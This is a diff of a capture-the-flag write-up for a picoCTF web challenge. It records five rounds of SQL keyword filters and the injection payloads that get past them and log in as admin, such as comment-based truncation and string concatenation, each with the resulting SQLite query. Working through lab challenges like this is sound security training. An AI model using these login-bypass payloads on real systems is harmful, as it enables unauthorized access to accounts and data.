@@ -10,43 +10,63 @@ http://jupiter.challenges.picoctf.org:50595/
 http://jupiter.challenges.picoctf.org:50595/filter.php
 
 It is actually execute the following sql in sqlite
+
 SELECT * FROM users WHERE username='*[username]*' AND password='*[password]*'
 
 ## Attempts
 attempts on http://jupiter.challenges.picoctf.org:50595/index.php
+
 After the following attempts, it responds "Congrats! You won! Check out filter.php"
 
 ### Round 1 
 filter: Round1: or
+
 username: admin' --
+
 password: 1 *(anything)*
+
 SELECT * FROM users WHERE username='admin' --' AND password='1'
 
 ### Round 2
 filter: Round2: or and like = --
+
 username: admin'; /*
+
 password: 1 *(anything)*
+
 SELECT * FROM users WHERE username='admin'; /*' AND password='1'
 
 ### Round 3
 filter: Round3:   or and = like > < --
+
 Tips: there is a space char (" ") in the filter
+
 username: admin';/*
+
 password: 1 *(anything)*
+
 SELECT * FROM users WHERE username='admin';/*' AND password='1'
 
 ### Round 4
 filter: Round4:   or and = like > < -- admin
+
 Tips: there is a space char (" ") in the filter
+
 username: admi'||'n';
+
 password: 1 *(anything)*
+
 SELECT * FROM users WHERE username='admi'||'n';' AND password='1'
 
 ### Round 5
 filter: Round5:   or and = like > < -- union admin
+
 Tips: there is a space char (" ") in the filter
+
 username: admi'||'n';
+
 password: 1 *(anything)*
+
 SELECT * FROM users WHERE username='admi'||'n';' AND password='1'
 
 ### You Won
